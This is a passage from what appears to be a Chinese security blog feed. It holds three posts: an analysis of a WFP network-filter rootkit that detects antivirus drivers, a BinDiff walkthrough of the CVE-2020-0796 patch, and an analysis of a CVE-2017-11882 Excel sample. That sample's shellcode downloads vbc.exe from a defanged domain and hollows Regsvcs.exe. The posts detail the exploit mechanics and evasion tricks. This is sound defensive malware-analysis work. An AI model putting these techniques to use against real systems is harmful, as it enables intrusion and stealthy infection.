src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200703202512519.png" alt="image-20200703202512519"></p><h2 id="检测过滤器状态"><a href="#检测过滤器状态" class="headerlink" title="检测过滤器状态"></a>检测过滤器状态</h2><p>调用函数<code>FwpmBfeStateGet0</code>检测过滤器的运行状态：</p><ul><li><p>当过滤器处于正在运行，便执行主要过滤函数<code>submain_1400026A0</code>;</p></li><li><p>当过滤器没有正在运行，便执行函数<code>FwpmBfeStateSubscribeChanges0</code>，当过滤器引擎状态发生改变便调用<code>subCallbackmain_1400077A8</code>函数（与<code>submain_1400026A0</code>相同）</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200703204413132.png" alt="image-20200703204413132"></p><h2 id="主要过滤行为"><a href="#主要过滤行为" class="headerlink" title="主要过滤行为"></a>主要过滤行为</h2><h3 id="开启过滤引擎"><a href="#开启过滤引擎" class="headerlink" title="开启过滤引擎"></a>开启过滤引擎</h3><p>先通过函数<code>ExUuidCreate</code>初始化25个UUID（UUID用来唯一标识提供者、子层、Callout），然后在调用函数<code>FwpmEngineOpen0</code>开启过滤引擎，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200703205703744.png" alt="image-20200703205703744"></p><p>添加名为<code>NFSDK Provider</code>的Provider，然后再通过<code>submainFwpsCalloutRegister2_1400028E8</code>函数注册Callout，以及<code>submainFwpmFilterAdd0_140001008</code>函数添加Filter，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200704124341034.png" alt="image-20200704124341034"></p><h3 id="注册Callout"><a href="#注册Callout" class="headerlink" title="注册Callout"></a>注册Callout</h3><p>先调用<code>FwpmTransactionBegin0</code>开启过滤设置，然后再调用<code>subFwpsCalloutRegister2_14000284C</code>函数来注册Callout，一共注册了22个callout，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200704142251282.png" alt="image-20200704142251282"></p><p>注册完后，当过滤器命中设置好的规则后(后面会添加过滤规则)，便会执行上图中<code>classifyFn1</code>函数，对相应网络数据进行过滤。由于一共注册了22个callout，其中大多需要实际网络环境才能触发，调试起来比较麻烦；静态也有很多结构体指针的使用，因此短时间内无法将每个callout所执行的行为完全分析清楚。</p><h3 id="检测杀软"><a href="#检测杀软" class="headerlink" title="检测杀软"></a>检测杀软</h3><p>通过查看驱动注册表项，来检测杀软的网络过滤驱动是否存在，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200704151535750.png" alt="image-20200704151535750"></p><h3 id="添加子层"><a href="#添加子层" class="headerlink" title="添加子层"></a>添加子层</h3><p>通过调用函数<code>FwpmSubLayerAdd0</code>分别添加NFSDK Sublayer子层和NFSDK Recv Sublayer子层，并根据检测杀软的结果来修改子层的权重（权重值决定过滤的优先级），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200704152444483.png" alt="image-20200704152444483"></p><h3 id="添加Callout和Filter"><a href="#添加Callout和Filter" class="headerlink" title="添加Callout和Filter"></a>添加Callout和Filter</h3><p>通过调用函数<code>subFwpmFilterAdd0_140001420</code>将之前注册的22个Callout添加到WFP过滤引擎中，并在成功添加Callout后再添加包含相应规则的Filter。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200704153418804.png" alt="image-20200704153418804"></p><p>函数<code>subFwpmFilterAdd0_140001420</code>，先通过函数<code>FwpmCalloutAdd0</code>添加Callout，当添加Callout成功后便在通过函数<code>FwpmFilterAdd0</code>向系统添加一个新的过滤器对象，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200704160727584.png" alt="image-20200704160727584"></p><p>其中上图中的<code>FWPM_FILTER_CONDITION0_</code>结构定义了需要满足什么条件时过滤条件成立。具体结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FWPM_FILTER_CONDITION0_</span> &#123;</span></span><br><span class="line">  GUID                 fieldKey;<span class="comment">//GUID</span></span><br><span class="line">  FWP_MATCH_TYPE       matchType; <span class="comment">//指定要执行的匹配类型</span></span><br><span class="line">  FWP_CONDITION_VALUE0 conditionValue;<span class="comment">//一个FWP_CONDITION_VALUE0结构，其中包含与该字段匹配的值。</span></span><br><span class="line">&#125; FWPM_FILTER_CONDITION0;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>该样本是一个典型的基于WFP框架开发的恶意Rootkit，对受害主机的特定网络数据包进行过滤，来实施恶意操作。该样本包含正常的文件签名，并且会检测系统中的安全软件进行对抗，一般难以发现。因此在日常使用中用户应注意辨别恶意软件。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 样本分析报告 </tag>
            
            <tag> Rootkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用BinDiff分析补丁文件</title>
      <link href="2020/03/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/"/>
      <url>2020/03/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/</url>
      
        <content type="html"><![CDATA[<center><font size =8><b>使用BinDiff分析补丁文件</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>本片文章主要是出自吾师邱老师，是其在教我们漏洞相关知识时写的，写的十分详细。今天做一回搬运工，大部分内容为整合邱老师的内容。</p></blockquote><h1 id="0x00-工具与环境"><a href="#0x00-工具与环境" class="headerlink" title="0x00 工具与环境"></a>0x00 工具与环境</h1><p><strong>分析环境为 Win10+IDA7.0+BinDiff5.0</strong></p><p>注：IDA7.4 必须搭配 BinDiff6.0，IDA7.0/7.2 必须搭配 BinDiff5.0</p><p><strong>下载地址：</strong></p><p>BinDiff：<a href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p><p>笔者这里环境时<strong>IDA7.0</strong>，所以这里下载<strong>BinDiff5.0.msi</strong>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200328224245925.png" alt="image-20200328224245925"></p><p>（注：点击上图中的bindiff5.msi没反应时，可右键新建标签页打开链接，进行下载。）</p><p>安装BinDiff时，在选择==IDA目录时==，要将其路径设置到自己IDA所在的根目录。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200328225535417.png" alt="image-20200328225535417"></p><p>其他的选项一路Next就可。若安装成功，可在IDA左上角<strong>File</strong>选项中，可看到<strong>BinDiff</strong>选项，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200328225910819.png" alt="image-20200328225910819"></p><h1 id="0x01-补丁分析实践"><a href="#0x01-补丁分析实践" class="headerlink" title="0x01 补丁分析实践"></a>0x01 补丁分析实践</h1><p>本次比较的漏洞补丁版本为KB4551762，上一个版本为KB4540673，漏洞编号为<code>CVE-2020-0796</code>，影响的操作系统为==Win10 1903/1909==，受影响文件：客户端 mrxsmb.sys ，服务端 srv2.sys 。</p><h2 id="漏洞的介绍："><a href="#漏洞的介绍：" class="headerlink" title="漏洞的介绍："></a>漏洞的介绍：</h2><blockquote><p>2020年3月11日，某国外安全公司发布了一个近期微软安全补丁包所涉及漏洞的综述，其中谈到了一个威胁等级被标记为Critical的SMB服务远程代码执行漏洞（CVE-2020-0796），攻击者可以利用此漏洞远程无需系统账户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制权。此漏洞主要影响支持SMBV3.1.1的设备，理论上存在蠕虫化的可能性。</p></blockquote><p><strong>备份文件</strong></p><p>查看 CVE 资料可知漏洞影响版本主要是 Win10 1903/1909 。根据前述补丁编号，下载好相应的文件，对受影响的文件进行分析。</p><p>以下是 x64 版本受影响的 MD5 列表：</p><table><thead><tr><th>文件</th><th>打补丁前 MD5</th><th>打补丁后 MD5</th></tr></thead><tbody><tr><td>mrxsmb.sys</td><td>A6F9BBFB31A1F17844B77FD642EC83A5</td><td>E242713AD12625A58C07F053C3696981</td></tr><tr><td>srv2.sys</td><td>F508EC2BFC244442D76091CB03BAE110</td><td>F037DE85645D30A21CD79CB1F8BB706A</td></tr></tbody></table><p><strong>下载对应的PDB文件</strong></p><p>因为微软会提供符号文件帮助分析，所以需要下载打补丁前后的 <code>pdb</code> 文件，方法：</p><p>1.在 WinDbg 目录下打开命令窗口；</p><p>2.执行命令，下载PDB文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">symchk -v &lt;MoudleFilePath&gt; </span><br></pre></td></tr></table></figure><p>3.下载成功后，将下载的文件命名成和原始文件同名的文件，这里是 mrxsmb.pdb，并将该文件复制到待分析的 mrxsmb.sys 同级目录。</p><h2 id="使用-BinDiff-进行比较"><a href="#使用-BinDiff-进行比较" class="headerlink" title="使用 BinDiff 进行比较"></a>使用 BinDiff 进行比较</h2><p>将打补丁前后的文件的 pdb 下载并改名后复制到待分析文件同级目录后，用 IDA 分析待分析文件，并生成 idb(或 i64)文件。将新、旧版本的文件 idb 都分析生成好。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200330222657608.png" alt="image-20200330222657608"></p><p>然后打开其中一个idb文件，并从 File 选项中选择 BinDiff，如图： </p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200330223845728.png" alt="image-20200330223845728"></p><p><strong>注：不能有中文路径，包括用户名也不能为中文。</strong></p><p>然后再从 IDA 打开 Matched Functions 窗口，点一下左上角的 Similarity，让相似度最低的排在前面，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200330224114523.png" alt="image-20200330224114523"></p><p>随便选一个函数，右键 -&gt;View grow graphs，BinDiff 便会打开一个比较窗口，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/02_%E4%BD%BF%E7%94%A8BinDiff%E5%88%86%E6%9E%90%E8%A1%A5%E4%B8%81/image-20200330224501815.png" alt="image-20200330224501815"></p><p>按 ctrl+鼠标滚轮可进行放大与缩小。</p><h2 id="寻找漏洞函数"><a href="#寻找漏洞函数" class="headerlink" title="寻找漏洞函数"></a>寻找漏洞函数</h2><p>后面就是分析了，仔细对比补丁做的修改，有条件的话尝试调试，最终分析出漏洞原理</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公式编辑器漏洞利用样本分析</title>
      <link href="2020/03/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
      <url>2020/03/20/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><font size =8><b>公式编辑器漏洞利用样本分析</b></font></center><h1 id="公式编辑器漏洞利用分析"><a href="#公式编辑器漏洞利用分析" class="headerlink" title="公式编辑器漏洞利用分析"></a>公式编辑器漏洞利用分析</h1><blockquote><p>在<strong>3月30号</strong>的发现了一起<code>CVE-2017-1182</code>漏洞利用的告警事件。经过分析，该告警事件是利用了公式编辑器的漏洞，通过执行精心构造好的shellcode，来下载远控并运行。</p></blockquote><p>经过溯源分析对比，发现该事件所涉及的样本在近期刚刚开始活跃。VirusTotal、AnyRun沙箱收录该样本的时间都为3月30号前后，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200405192300626.png" alt="image-20200405192300626"></p><h1 id="样本执行流程"><a href="#样本执行流程" class="headerlink" title="样本执行流程"></a>样本执行流程</h1><p>该样本原文件名为<code>PassWord.xlsx</code>，将其打开后便会有伪造的提示图片提示该文件是被保护的，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406182157946.png" alt="image-20200406182157946"></p><p>启用编辑后，便会调用公式编辑器进程，执行<code>shellcode</code>下载并运行恶意样本。整体流程如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="流程图"></p><h1 id="关于CVE-2017-11882"><a href="#关于CVE-2017-11882" class="headerlink" title="关于CVE-2017-11882"></a>关于CVE-2017-11882</h1><blockquote><p><code>CVE-2017-11882</code>漏洞是属于缓冲区溢出类型的漏洞，攻击者可利用此漏洞实现任意代码执行，并且隐蔽性极高。该漏洞通杀目前被广泛使用的<strong>Office 2003到2016的所有版本</strong>。漏洞产生的原因主要是由于<code>EQNEDT32.EXE</code>(Office自带的公式编辑器)在读入包含MathType的ole数据时，拷贝公式名称（Font Name 数据）没有对名称长度进行校验，导致了缓冲区溢出，最终将函数返回地址覆盖为恶意代码的地址处，从而实现了任意代码执行。</p></blockquote><p><strong>漏洞产生原因</strong></p><p>由于公式编辑器在没有打补丁的情况下，并没有开启<code>ASLR</code>以及<code>DEP</code>保护，并且在函数<code>sub_41160F</code>在对字符串进行拷贝时，没有对要拷贝的字符串参数长度进行校验，从而导致了可能发生栈溢出的问题。发生栈溢出的位置，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406163945429.png" alt="image-20200406163945429"></p><h1 id="文档格式分析"><a href="#文档格式分析" class="headerlink" title="文档格式分析"></a>文档格式分析</h1><p>该样本是经过 <strong>Excel</strong> 加密过的复合文档(<code>CDFV2-Encrypted</code>)。使用加密的有效负载是规避防病毒软件的常用方法，因为加密的有效负载会根据使用的密钥不同而发生变化。该加密的复合文档的文件目录如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406211426113.png" alt="image-20200406211426113"></p><p>将加密的复合文档进行解密（office有默认密码<code>VelvetSweatshop</code>，然后可以通过脚本msoffcrypto-tool对其进行解密），解密完之后可以得到一个正常的 <strong>xlsx</strong> 文档文件。并从其<code>xl\embeddings</code>中可见其包含了两个对象，分别为 <strong>docm 宏对象</strong>（只是一张图片并不含宏）和 <strong>oleObject1.bin</strong>（公式编辑器对象）。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406164941595.png" alt="image-20200406164941595"></p><p>根据我们对<code>CVE-2017-1182</code>的理解，该漏洞通常是利用.rtf文件格式，是因为其可以添加自动更新标签来实现自动打开Ole对象来执行 <strong>shellcode</strong>。而 xlsx 以及 docx 文档文件默认是不会自动加载或更新 <strong>oleObject</strong> 对象的，而该病毒样本却能直接打开公式编辑器对象。最终经过分析，该病毒在<code>\xl\worksheets</code>目录下的<code>sheeet1.xml</code>设置了自动加载 <strong>oleObject</strong> 对象属性，只需要将<code>autoLoad</code>的值置为1，就可以在打开 Excel 表的同时自动加载公式编辑器对象，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406172548551.png" alt="image-20200406172548551"></p><h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><h2 id="shellcode分析"><a href="#shellcode分析" class="headerlink" title="shellcode分析"></a>shellcode分析</h2><p><strong>查看 shellcode</strong></p><p>查看公式编辑器对象中的Data数据，可看到大量篇幅的 <strong>shellcode</strong> 以及栈溢出时要覆盖函数返回地址的数据<code>0x444C9F5</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406171626082.png" alt="image-20200406171626082"></p><p><strong>覆盖函数返回地址</strong></p><p>由于漏洞<code>CVE-2017-11882</code>，发生栈异常的位置是在<code>0x411658</code>处，便在该地址处下断点。在执行过拷贝后，便会发生栈溢出将返回地址覆盖掉，拷贝前后的对比图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406173924159.png" alt="image-20200406173924159"></p><p><strong>跳转到栈中执行shellcode</strong></p><p>覆盖的函数返回地址的值为<code>0x44C9F5</code>，该地址处的指令为<code>retn</code>。当函数执行到返回时，便会跳转到该地址处执行<code>retn</code>指令，跳转到当前栈顶数据<code>12F350</code>中去执行第一部分的 <strong>sehllcode</strong> ，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406175220745.png" alt="image-20200406175220745"></p><p>此时的栈顶的值<code>12F350</code>正是指向是要拷贝的字符串中的第一部分 <strong>shellcode</strong> 数据（<code>oleObject1.bin</code>对象覆盖返回地址前的数据）。跳转到第一部分 <strong>shellcode</strong> 中执行：</p><ul><li><p>首先从公式编辑器的全局变量固定地址<code>45BD3C</code>中取出栈地址，并从该栈地址处取出指向存放公式编辑器对象的Data数据段（存放着第二部分<strong>shellcode</strong>数据）的堆地址的指针。</p></li><li><p>再计算出公式编辑器固定<strong>IAT</strong>地址<code>4667B0</code>，从该地址处获取‬函数<code>Globallock</code>地址，并锁定上一步获取到的堆地址。</p></li><li><p>最后在将堆基质加上偏移 <code>5BBFD</code>，跳转过去执行第二部分 <strong>shellcode</strong> ，如图：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200407110722326.png" alt="image-20200407110722326"></p><h2 id="远程下载执行"><a href="#远程下载执行" class="headerlink" title="远程下载执行"></a>远程下载执行</h2><p>第二部分 <strong>shellcode</strong>：</p><ul><li>首先执行自解密操作。</li><li>然后再遍历PEB，获取<code>kernel32.dll</code>的基址，再根据基址遍历其导出表获取函数<code>LoadLibraryW</code>和<code>GetProcAddress</code></li><li>再用<code>GetProcess</code>获取所需API，最终从域名<strong>prodigorganizationalgroupoffrdy1company.duckdns[.]org</strong>下载并运行<code>vbc.exe</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200405193308773-1586174035327.png" alt="image-20200405193308773"></p><p>捕获到的Shellcode中涉及的关键信息</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406112854039-1586174035327.png" alt="image-20200406112854039"></p><p>经分析，<code>vbc.exe</code>为编译打包后的AutoIt可执行程序</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200405184810620-1586174035328.png" alt="image-20200405184810620"></p><p>执行过程中会提取嵌在资源中的<code>AutoIt</code>脚本并执行</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200405191330871-1586174035328.png" alt="image-20200405191330871"></p><h2 id="创建傀儡进程"><a href="#创建傀儡进程" class="headerlink" title="创建傀儡进程"></a>创建傀儡进程</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406114121867-1586174035328.png" alt="image-20200406114121867"></p><p>挂起方式启动Regsvcs.exe</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406115822151-1586174035328.png" alt="image-20200406115822151"></p><p>接下来向该Regsvcs.exe的内存空间进行写入，创建傀儡进程</p><p>将内存中的PE文件Dump下来进行分析</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406164058541-1586174035328.png" alt="image-20200406164058541"></p><p>经去混淆后可以看到大量解密操作</p><p><img 